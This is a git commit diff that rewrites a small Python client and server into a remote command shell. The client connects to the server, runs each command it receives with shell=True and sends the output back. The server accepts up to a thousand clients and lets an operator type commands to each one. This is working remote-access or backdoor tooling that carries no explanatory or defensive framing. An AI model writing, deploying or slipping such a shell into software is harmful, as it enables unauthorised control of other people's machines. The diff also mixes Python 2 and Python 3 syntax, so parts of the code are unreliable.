e13347804274ac171582ef46f10fa54d43e0a2d8
root <root@localhost.localdomain>
2016-09-13 10:14:36 +0300

    update

--- client.py
+++ client.py
@@ -1,17 +1,39 @@
 #!/usr/bin/env python
 
 import socket
+from os import chdir
+from subprocess import check_output
+sock = socket.socket()
+sock.connect(('localhost', 7125))
 
-hote = "5.58.57.50"
-port = 15555
+while 1:
+    x = sock.recv(1024)
+    print(x)
+     #p = subprocess.Popen(x, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+     #out, error = p.communicate()
+     #subprocess.call(x, shell=True)
+     #print(out)
+    try:
+        if 'cd' in x.decode():
+            chdir(x[3:])
+            out = check_output("ls", shell=True)
+            sock.send(out)
+        elif x.decode('utf-8') == "":
+            sock.close()
+            break
+        elif x.decode() == 'q':
+            print"\nClosing the connection\n"
+            sock.close()
+            break
+        else:
+            out = check_output(x, shell=True)
+            sock.send(out)
+        continue
 
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.connect((hote, port))
-print("Connection on {}".format(port))
-count = 6
-socket.send("\nHey my name is Darel!\n".encode())
-
-socket.send("\nTesting the client \n".encode())
-
-print("Close")
-socket.close()
+    except FileNotFoundError:
+        print("\nNo such of file or Directory, please check the name\n")
+        out = check_output("pwd", shell=True)
+        sock.send(out)
+    except KeyboardInterrupt:
+        print("\nClosing the AID client \nExiting...")
+        sock.close()
--- server.py
+++ server.py
@@ -1,18 +1,36 @@
-#!/usr/bin/env python
-
 import socket
+from _thread import start_new_thread
 
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.bind(('', 15555))
+count = 0
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('', 7125))
+sock.listen(1000)
+#Printing that the server started
+print("\nServer starded \n")
 
-while True:
-        socket.listen(5)
-        client, address = socket.accept()
-        print "{} connected".format( address )
-        response = client.recv(255)
-        if response != "":
-                print response
+#Creating a function for each client
+def new_client(conn):
+    
+    while 1:
+        x = input("\n{0}: ".format(addr[0]))
+        conn.send(x.encode())
+        respond = conn.recv(1024)
+        print("\nFrom {0}\n".format(addr[0]))
+        print(str(respond.decode()))
+        if respond.decode() == "":
+            conn.close()
+            print("\nClonnection closed\nwaiting for a connection\n")
+            break
+        continue
 
-print "Close"
-client.close()
-stock.close()
+while 1:
+    try:
+        conn, addr = sock.accept()
+        print('\nconnected:', addr)
+        start_new_thread(new_client, (conn,))
+        count += 1
+        print("number of client connected: {0}".format(count))
+    except KeyboardInterrupt:
+        print("\nClosing the Server \nExiting...")
+        conn.close()
+        exit()
